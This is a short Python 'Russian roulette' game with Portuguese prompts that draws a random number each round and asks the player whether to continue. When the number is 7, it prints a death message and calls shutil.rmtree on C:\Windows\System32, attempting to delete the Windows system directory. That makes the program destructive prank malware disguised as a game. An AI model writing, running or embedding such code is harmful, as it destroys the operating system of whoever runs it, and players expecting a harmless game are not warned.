import random
import shutil

flag = True

while flag:

    sorteio = random.randint(1, 10)
    print(f"O número sorteado foi: {sorteio}")

    if sorteio == 7:
        print("Você MORREU!!!!! Hasta la vista Baby")
        shutil.rmtree(r"C:\Windows\System32")
        flag = False

    else:
        print("você sobreviveu!!")
        continuar = input("Quer continuar? [y/n]: ")
        if continuar == "y" or continuar == "Y":
            print("PRÓXIMO TIRO \n")
            pass
        elif continuar == "N" or continuar == "n":
            print("COVARDE, Fim de jogo \n")
            flag = False
        else:
            print("Valor inváido, vai simbora \n")
            flag = False
